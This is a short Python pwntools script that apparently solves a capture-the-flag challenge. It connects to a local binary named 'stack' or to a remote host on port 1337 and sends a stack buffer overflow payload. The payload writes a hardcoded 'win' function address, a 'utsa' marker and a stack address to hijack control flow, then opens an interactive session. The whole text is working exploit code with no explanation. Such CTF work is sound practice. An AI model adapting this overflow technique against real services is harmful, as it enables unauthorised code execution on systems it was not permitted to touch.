from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0
if debug:
    p = process("./stack")
    stack = 0xffffdbc6
else:
    p = remote("35.237.220.217", 1337)
    stack = 0xffffdc86

win = 0x0804854d
#gdb.attach(proc.pidof(p)[0])

p.recvuntil("Send me food!!! Give me input")
payload = "A" * 4 + p32(win) + "B" * 42 + "utsa" + 'C' * 12 + p32(stack)
p.sendline(payload)

p.interactive()